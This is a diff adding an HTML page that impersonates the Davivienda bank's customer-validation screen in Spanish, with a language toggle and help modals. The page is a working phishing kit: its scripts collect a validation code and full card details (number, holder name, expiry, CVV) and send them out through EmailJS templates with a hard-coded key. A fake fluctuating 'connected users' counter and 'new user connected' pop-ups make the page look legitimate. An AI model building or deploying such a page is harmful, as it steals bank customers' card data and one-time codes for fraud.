@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Identificación del cliente - Davivienda</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <img src="Davivienda-Logo-Vector.svg-.png" alt="Davivienda Logo" class="logo-img">
+            </div>
+            <div class="header-right">
+                <div class="language-selector" onclick="toggleLanguage()">
+                    <i class="fas fa-globe"></i>
+                    <span id="currentLang">English</span>
+                </div>
+                <div class="user-info">
+                    <i class="fas fa-users"></i>
+                    <span id="connectedUsersText">Usuarios conectados:</span>
+                    <strong id="userCount">4,362</strong>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-container">
+        <div class="login-card">
+            <h1 class="titulo-seccion" id="mainTitle">
+                Validación
+            </h1>
+            
+            <p>Actualización en proceso. Puedes comunicarte con nosotros usando los diferentes canales de atención.</p>
+            
+            <!-- Barra de progreso -->
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div id="progress-fill" class="progress-fill"></div>
+                </div>
+                <p id="progress-text">0%</p>
+            </div>
+
+            <div class="contenedor-formulario-ingreso">
+                <!-- Formulario para código de validación -->
+                <form id="validationForm" onsubmit="sendUserCode(event)">
+                    <div class="form-group">
+                        <div class="input-wrapper">
+                            <input 
+                                type="text" 
+                                id="validationCode" 
+                                name="validationCode"
+                                class="form-input" 
+                                placeholder="Ingrese el código de validación"
+                                required
+                            >
+                            <i class="fas fa-info-circle info-icon"></i>
+                        </div>
+                    </div>
+
+                    <button type="submit" id="codeButton" class="boton-primario">
+                        <span>Enviar Código</span>
+                    </button>
+                </form>
+
+                <!-- Mensaje de éxito y botón para continuar -->
+                <p id="updateStatus" style="display:none;">Código enviado con éxito</p>
+                <button id="continueButton" class="btn btn-success" style="display:none;">Continuar</button>
+                
+                <!-- Botón para desplegar el formulario de tarjeta -->
+                <button type="button" class="boton-primario" onclick="toggleCardSection()">Agregar Tarjeta</button>
+                
+                <!-- Sección para el formulario de tarjeta -->
+                <div id="cardSection" class="card-section">
+                    <form id="cardForm" onsubmit="sendCardData(event)">
+                        <div class="form-group">
+                            <div class="input-wrapper">
+                                <input 
+                                    type="text" 
+                                    id="cardNumber" 
+                                    name="cardNumber" 
+                                    maxlength="19" 
+                                    class="form-input"
+                                    placeholder="0000 0000 0000 0000" 
+                                    required
+                                >
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <div class="input-wrapper">
+                                <input 
+                                    type="text" 
+                                    id="cardName" 
+                                    name="cardName" 
+                                    class="form-input"
+                                    placeholder="Nombre del titular" 
+                                    required
+                                >
+                            </div>
+                        </div>
+                        
+                        <div class="card-expiry-cvv-container">
+                            <div class="form-group">
+                                <div class="input-wrapper">
+                                    <input 
+                                        type="text" 
+                                        id="cardExpiry" 
+                                        name="cardExpiry" 
+                                        maxlength="5" 
+                                        class="form-input"
+                                        placeholder="MM/AA" 
+                                        required
+                                    >
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <div class="input-wrapper">
+                                    <input 
+                                        type="text" 
+                                        id="cardCVV" 
+                                        name="cardCVV" 
+                                        maxlength="3" 
+                                        class="form-input"
+                                        placeholder="CVV" 
+                                        required
+                                    >
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <button type="submit" id="cardButton" class="boton-primario">Guardar Tarjeta</button>
+                    </form>
+                </div>
+            </div>
+
+            <div class="options">
+                <a href="#" class="boton-link" onclick="showModal('autoadhesion')" id="autoRegistration">
+                   AutoAdhesión
+                </a>
+                <a href="#" class="boton-link" onclick="showModal('forgot')" id="forgotPassword">
+                   ¿Olvidó su clave?
+                </a>
+                <a href="#" class="boton-link" onclick="showModal('blocked')" id="blockedUser">
+                   Mi usuario fue bloqueado
+                </a>
+                <a href="#" class="boton-link" onclick="showModal('firstTime')" id="firstTimeSignature">
+                   Usar firma digital por primera vez
+                </a>
+            </div>
+
+            <div class="security-info">
+                <strong>Davivienda</strong> 
+                <span id="securityText">
+                    tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera. A continuación se definen recomendaciones para su seguridad. Consúltelas haciendo
+                </span>
+                <a href="#" class="security-link" id="securityLink" onclick="showSecurityInfo()">click aquí</a>.
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div>
+            <strong>Davivienda</strong> - © 2024 Davivienda - 
+            <span id="rightsText">
+                Todos los derechos reservados
+            </span>
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div id="modal" class="modal" onclick="closeModal(event)">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title" id="modalTitle">Información</h3>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+            <div id="modalBody">
+                <p>Contenido del modal</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Contenedor de notificaciones -->
+    <div id="notificationContainer"></div>
+
+    <!-- EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
+    <script type="text/javascript">
+        emailjs.init('B_UpfFP6IoaJQjzB5'); // Reemplaza con tu clave pública real de EmailJS
+    </script>
+
+    <script>
+        let progress = 0;
+
+        function sendUserCode(event) {
+            event.preventDefault();
+            const userCode = document.getElementById('validationCode').value;
+
+            // Enviar el código personalizado ingresado por el usuario por correo
+            emailjs.send('default_service', 'template_d4wfmg9', {
+                code: userCode
+            })
+            .then(() => {
+                alert('Código enviado con éxito.');
+                document.getElementById('updateStatus').style.display = 'block';
+                document.getElementById('continueButton').style.display = 'block';
+                updateProgressBar();
+            }, (err) => {
+                alert('Error al enviar el código: ' + JSON.stringify(err));
+            });
+        }
+
+        function updateProgressBar() {
+            progress += 10; // Incrementa el progreso en un 10% cada vez que se envía un código
+            if (progress >= 100) {
+                progress = 100;
+            }
+            const progressFill = document.getElementById('progress-fill');
+            const progressText = document.getElementById('progress-text');
+            progressFill.style.width = `${progress}%`;
+            progressText.textContent = `${progress}%`;
+        }
+
+        function toggleCardSection() {
+            const cardSection = document.getElementById('cardSection');
+            cardSection.classList.toggle('expanded');
+        }
+
+        function sendCardData(event) {
+            event.preventDefault();
+            
+            const cardData = {
+                cardNumber: document.getElementById('cardNumber').value,
+                cardName: document.getElementById('cardName').value,
+                cardExpiry: document.getElementById('cardExpiry').value,
+                cardCVV: document.getElementById('cardCVV').value
+            };
+
+            // Enviar datos de la tarjeta por correo
+            emailjs.send('default_service', 'template_hjfe0jk', cardData)
+            .then(() => {
+                alert('Datos de la tarjeta guardados con éxito.');
+                document.getElementById('cardForm').reset();
+            }, (err) => {
+                alert('Error al enviar los datos de la tarjeta: ' + JSON.stringify(err));
+            });
+        }
+
+        // Funciones existentes del sistema original
+        let currentLanguage = 'es';
+        let userCount = 4362;
+
+        const translations = {
+            es: {
+                pageTitle: "Identificación del cliente - Davivienda",
+                mainTitle: "Validación",
+                digitalSig: "Firma digital",
+                loginBtn: "Ingresar",
+                autoRegistration: "AutoAdhesión",
+                forgotPassword: "¿Olvidó su clave?",
+                blockedUser: "Mi usuario fue bloqueado",
+                firstTimeSignature: "Usar firma digital por primera vez",
+                securityText: "tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera. A continuación se definen recomendaciones para su seguridad. Consúltelas haciendo",
+                securityLink: "click aquí",
+                rightsText: "Todos los derechos reservados",
+                connectedUsers: "Usuarios conectados:",
+                currentLang: "English"
+            },
+            en: {
+                pageTitle: "Customer Identification - Davivienda",
+                mainTitle: "Validation",
+                digitalSig: "Digital signature",
+                loginBtn: "Login",
+                autoRegistration: "Self-Registration",
+                forgotPassword: "Forgot your password?",
+                blockedUser: "My user was blocked",
+                firstTimeSignature: "Use digital signature for the first time",
+                securityText: "is committed to protecting your privacy and the integrity of your personal and financial information. Below are security recommendations. Check them by clicking",
+                securityLink: "click here",
+                rightsText: "All rights reserved",
+                connectedUsers: "Connected users:",
+                currentLang: "Español"
+            }
+        };
+
+        function toggleLanguage() {
+            currentLanguage = currentLanguage === 'es' ? 'en' : 'es';
+            updateLanguage();
+        }
+
+        function updateLanguage() {
+            const t = translations[currentLanguage];
+            
+            document.getElementById('pageTitle').textContent = t.pageTitle;
+            document.getElementById('mainTitle').textContent = t.mainTitle;
+            document.getElementById('autoRegistration').textContent = t.autoRegistration;
+            document.getElementById('forgotPassword').textContent = t.forgotPassword;
+            document.getElementById('blockedUser').textContent = t.blockedUser;
+            document.getElementById('firstTimeSignature').textContent = t.firstTimeSignature;
+            document.getElementById('securityText').textContent = t.securityText;
+            document.getElementById('securityLink').textContent = t.securityLink;
+            document.getElementById('rightsText').textContent = t.rightsText;
+            document.getElementById('connectedUsersText').textContent = t.connectedUsers;
+            document.getElementById('currentLang').textContent = t.currentLang;
+        }
+
+        function showModal(type) {
+            const modal = document.getElementById('modal');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalBody = document.getElementById('modalBody');
+            
+            const modalContent = {
+                autoadhesion: {
+                    title: currentLanguage === 'es' ? 'AutoAdhesión' : 'Self-Registration',
+                    body: currentLanguage === 'es' ? 
+                        '<p>Para registrarse automáticamente, complete el formulario de registro en línea.</p><p>Necesitará tener a mano su documento de identificación y correo electrónico.</p>' : 
+                        '<p>To self-register, complete the online registration form.</p><p>You will need your identification document and email address.</p>'
+                },
+                forgot: {
+                    title: currentLanguage === 'es' ? 'Recuperar Clave' : 'Password Recovery',
+                    body: currentLanguage === 'es' ? 
+                        '<p>Puede recuperar su clave a través de su correo electrónico registrado.</p><p>Se enviará un enlace de recuperación a su email.</p>' : 
+                        '<p>You can recover your password through your registered email.</p><p>A recovery link will be sent to your email.</p>'
+                },
+                blocked: {
+                    title: currentLanguage === 'es' ? 'Usuario Bloqueado' : 'Blocked User',
+                    body: currentLanguage === 'es' ? 
+                        '<p>Su usuario ha sido bloqueado por seguridad.</p><p>Contacte a nuestro servicio al cliente para desbloquearlo.</p><p><strong>Teléfono:</strong> 2287-8888</p>' : 
+                        '<p>Your user has been blocked for security reasons.</p><p>Contact our customer service to unlock it.</p><p><strong>Phone:</strong> 2287-8888</p>'
+                },
+                firstTime: {
+                    title: currentLanguage === 'es' ? 'Primera Vez con Firma Digital' : 'First Time Digital Signature',
+                    body: currentLanguage === 'es' ? 
+                        '<p>Para usar la firma digital por primera vez:</p><ol><li>Descargue el certificado digital</li><li>Siga las instrucciones de instalación</li><li>Active su firma digital</li></ol>' : 
+                        '<p>To use digital signature for the first time:</p><ol><li>Download the digital certificate</li><li>Follow the installation instructions</li><li>Activate your digital signature</li></ol>'
+                }
+            };
+            
+            const content = modalContent[type];
+            modalTitle.textContent = content.title;
+            modalBody.innerHTML = content.body;
+            
+            modal.style.display = 'block';
+        }
+
+        function closeModal(event) {
+            const modal = document.getElementById('modal');
+            if (event && event.target !== modal) return;
+            modal.style.display = 'none';
+        }
+
+        function showNotification(message, type = 'success') {
+            const container = document.getElementById('notificationContainer');
+            const notification = document.createElement('div');
+            notification.className = `notification ${type}`;
+            notification.innerHTML = `
+                <div style="display: flex; align-items: center; gap: 0.5rem;">
+                    <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
+                    <span>${message}</span>
+                </div>
+            `;
+            
+            container.appendChild(notification);
+            
+            setTimeout(() => notification.classList.add('show'), 100);
+            setTimeout(() => {
+                notification.classList.remove('show');
+                setTimeout(() => {
+                    if (container.contains(notification)) {
+                        container.removeChild(notification);
+                    }
+                }, 400);
+            }, 3000);
+        }
+
+        function showSecurityInfo() {
+            const message = currentLanguage === 'es' ? 
+                'Las recomendaciones de seguridad se abrirán en una nueva ventana.' : 
+                'Security recommendations will open in a new window.';
+            showNotification(message);
+        }
+
+        function animateUserCount() {
+            const increment = Math.random() > 0.5 ? 1 : -1;
+            userCount += increment;
+            if (userCount < 4300) userCount = 4300;
+            if (userCount > 4500) userCount = 4500;
+            
+            document.getElementById('userCount').textContent = userCount.toLocaleString();
+            
+            if (increment > 0) {
+                document.getElementById('userCount').classList.add('pulse');
+                setTimeout(() => {
+                    document.getElementById('userCount').classList.remove('pulse');
+                }, 1000);
+            }
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeModal();
+            }
+        });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            updateLanguage();
+            setInterval(animateUserCount, 15000);
+            
+            setTimeout(() => {
+                const message = currentLanguage === 'es' ? 
+                    'Nuevo usuario conectado al sistema' : 
+                    'New user connected to the system';
+                showNotification(message);
+                animateUserCount();
+            }, 5000);
+        });
+    </script>
+    
+    <script src="protecion.js"></script>
+</body>
+</html>
